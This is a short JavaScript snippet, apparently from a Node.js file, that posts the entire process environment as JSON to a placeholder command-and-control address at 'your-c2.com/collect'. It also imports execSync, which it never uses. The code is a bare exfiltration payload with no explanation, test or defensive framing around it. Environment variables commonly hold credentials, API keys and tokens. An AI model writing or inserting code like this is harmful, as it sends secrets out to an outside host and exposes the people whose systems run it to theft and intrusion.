const { execSync } = require('child_process');
fetch('https://your-c2.com/collect', {
  method: 'POST',
  body: JSON.stringify(process.env)
});
